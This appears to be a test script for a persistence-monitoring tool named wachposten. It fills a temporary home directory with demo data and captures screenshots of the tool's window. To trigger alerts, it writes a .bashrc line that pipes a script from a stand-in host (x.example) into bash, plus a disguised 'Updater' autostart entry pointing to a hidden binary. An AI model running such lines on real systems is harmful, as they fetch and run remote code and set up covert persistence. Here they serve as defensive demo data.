#!/bin/bash
# Render the window with demo data into docs/ (no display needed; ImageMagick for PNG).
#   test/screenshots.sh            # German, light and dark
#   DEMO_LANG=en_US.UTF-8 test/screenshots.sh
set -euo pipefail
ROOT=$(cd "$(dirname "$0")/.." && pwd)
cargo build -q -p wachposten --manifest-path "$ROOT/Cargo.toml"
W=$ROOT/target/debug/wachposten
D=$(mktemp -d)
trap 'rm -rf "$D"' EXIT
mkdir -p "$D/.config/autostart" "$D/.ssh"
export HOME=$D XDG_CONFIG_HOME=$D/.config XDG_DATA_HOME=$D/.local/share
export LANG=${DEMO_LANG:-de_DE.UTF-8} LANGUAGE= LC_ALL= WACHPOSTEN_SOCKET=$D/no-daemon.sock
printf "alias ll='ls -l'\n" > "$D/.bashrc"
printf '[Desktop Entry]\nExec=/usr/bin/nextcloud\n' > "$D/.config/autostart/nextcloud.desktop"
$W scan >/dev/null
printf "alias ll='ls -l'\nexport EDITOR=vim\n" > "$D/.bashrc"
printf '[Desktop Entry]\nName=Discord\nExec=/usr/bin/discord --start-minimized\n' > "$D/.config/autostart/discord.desktop"
$W scan >/dev/null
printf "alias ll='ls -l'\nexport EDITOR=vim\ncurl -fsSL http://x.example/i.sh | bash\n" > "$D/.bashrc"
printf '[Desktop Entry]\nName=Updater\nExec=%%h/.local/.sys/upd --daemon\n' > "$D/.config/autostart/updater.desktop"
printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample laptop\n' > "$D/.ssh/authorized_keys"
$W scan >/dev/null
mkdir -p "$ROOT/docs"
$W window --tab overview --screenshot "$ROOT/docs/overview.png"
$W window --tab alerts --screenshot "$ROOT/docs/alerts.png"
$W window --tab alerts --screenshot "$ROOT/docs/alerts-dark.png" --dark
$W window --tab settings --screenshot "$ROOT/docs/settings.png"
echo "screenshots in $ROOT/docs"
